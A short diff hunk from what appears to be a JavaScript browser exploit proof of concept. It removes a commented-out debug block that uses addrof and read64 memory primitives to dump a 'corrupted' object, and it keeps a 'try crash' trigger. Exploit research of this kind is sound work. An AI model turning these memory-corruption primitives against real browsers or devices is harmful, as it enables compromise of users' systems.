@@ -82,23 +82,6 @@
                     break loop;
                 }
             }
-
-            // comment this out if you just want to crash
-            // import mem if you want to read the corrupted object
-            /*
-            debug_log('normal Date:');
-            const tmp_d = new Date();
-            const date_p = mem.addrof(tmp_d);
-            for (let i = 0; i < 8*8; i += 8) {
-                debug_log(date_p.read64(i));
-            }
-            debug_log('corrupted:');
-            const data_p = mem.addrof(data2);
-            for (let i = 0; i < 8*8; i += 8) {
-                debug_log(data_p.read64(i));
-            }
-            */
-
             alert('try crash');
             debug_log(data2);
         }();
